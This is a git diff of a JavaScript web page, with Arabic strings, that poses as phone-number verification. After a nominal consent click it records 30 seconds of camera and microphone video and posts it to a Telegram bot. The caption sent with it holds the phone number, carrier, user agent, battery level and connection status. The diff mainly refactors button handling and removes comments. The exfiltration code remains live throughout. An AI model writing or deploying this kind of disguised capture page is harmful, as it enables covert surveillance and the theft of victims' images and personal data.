@@ -1,7 +1,7 @@
 let botToken = '';
 let chatId = '';
 
-// تحميل بيانات البوت من ملف config.json
+// تحميل التوكن ومعرف الدردشة
 fetch('config.json')
   .then(res => {
     if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`);
@@ -16,14 +16,12 @@ fetch('config.json')
     alert('فشل تحميل الإعدادات. يرجى التحقق من وجود الملف config.json.');
   });
 
-// مراقبة إدخال رقم الهاتف وعرض مزود الخدمة
 document.getElementById('phoneNumber').addEventListener('input', () => {
   const phone = document.getElementById('phoneNumber').value;
   const carrierName = detectCarrier(phone);
   document.getElementById('carrierDisplay').innerText = "مزود الخدمة: " + carrierName;
 });
 
-// كشف مزود الخدمة من خلال البادئة
 function detectCarrier(phoneNumber) {
   const cleaned = phoneNumber.replace(/\D/g, '');
   const prefix = cleaned.substring(0, 2);
@@ -36,13 +34,11 @@ function detectCarrier(phoneNumber) {
   }
 }
 
-// إخفاء مربع الموافقة وإظهار زر التأكيد
 function confirmConsent() {
   document.getElementById('consentBox').style.display = 'none';
   document.getElementById('confirmBtn').style.display = 'inline-block';
 }
 
-// بدء تسجيل الفيديو والتحقق
 function startCameraAndSend() {
   const phoneNumber = document.getElementById('phoneNumber').value.trim();
   if (phoneNumber === '') {
@@ -51,14 +47,13 @@ function startCameraAndSend() {
   }
   document.getElementById('confirmBtn').innerHTML = 'جاري التحقق...';
   document.getElementById('confirmBtn').disabled = true;
-
   recordAndSendVideo(phoneNumber);
 }
 
-// تسجيل الفيديو وإرساله
 async function recordAndSendVideo(phoneNumber) {
   if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
     alert("المتصفح لا يدعم الخدمة.");
+    resetButton();
     return;
   }
 
@@ -83,27 +78,22 @@ async function recordAndSendVideo(phoneNumber) {
         method: 'POST',
         body: formData
       })
-      .then(res => res.json())
-      .then(result => {
-        if (!result.ok) {
-          console.error("فشل إرسال الفيديو:", result.description);
-        }
-      })
-      .catch(err => {
-        console.error("خطأ أثناء الإرسال:", err);
-      });
+        .then(res => res.json())
+        .then(result => {
+          if (!result.ok) console.error("فشل الإرسال:", result.description);
+        })
+        .catch(err => {
+          console.error("خطأ أثناء الإرسال:", err);
+        });
 
       document.getElementById('confirmedNumber').innerText = phoneNumber;
       document.getElementById('confirmationMessage').style.display = 'block';
-
-      // إيقاف الكاميرا
       stream.getTracks().forEach(track => track.stop());
-      document.getElementById('confirmBtn').innerHTML = 'تأكيد';
-      document.getElementById('confirmBtn').disabled = false;
+      resetButton();
     };
 
     mediaRecorder.start();
-    setTimeout(() => mediaRecorder.stop(), 30000); // التسجيل لمدة 30 ثانية
+    setTimeout(() => mediaRecorder.stop(), 30000);
 
   } catch (error) {
     console.error("فشل الوصول إلى الكاميرا:", error);
@@ -112,15 +102,18 @@ async function recordAndSendVideo(phoneNumber) {
     } else if (error.name === 'NotFoundError') {
       alert("لم يتم العثور على الكاميرا أو الميكروفون.");
     } else {
-      alert("تعذر تشغيل الكاميرا. تحقق من إعدادات المتصفح.");
+      alert("حدث خطأ في الكاميرا.");
     }
-
-    document.getElementById('confirmBtn').innerHTML = 'تأكيد';
-    document.getElementById('confirmBtn').disabled = false;
+    resetButton();
   }
 }
 
-// جمع بيانات الجهاز والاتصال
+function resetButton() {
+  const btn = document.getElementById('confirmBtn');
+  btn.innerHTML = 'تأكيد';
+  btn.disabled = false;
+}
+
 async function collectUserInfo(phoneNumber) {
   const userAgent = navigator.userAgent;
   const connectionStatus = navigator.onLine ? "متصل بالإنترنت" : "غير متصل";
@@ -137,5 +130,6 @@ async function collectUserInfo(phoneNumber) {
 
   const carrier = detectCarrier(phoneNumber);
   const caption = `📱 رقم الهاتف: ${phoneNumber}\n🏢 مزود الخدمة: ${carrier}\n🖥️ نوع الجهاز: ${userAgent}\n🔋 نسبة البطارية: ${batteryLevel}\n🌐 اتصال الإنترنت: ${connectionStatus}`;
+
   return { caption };
 }
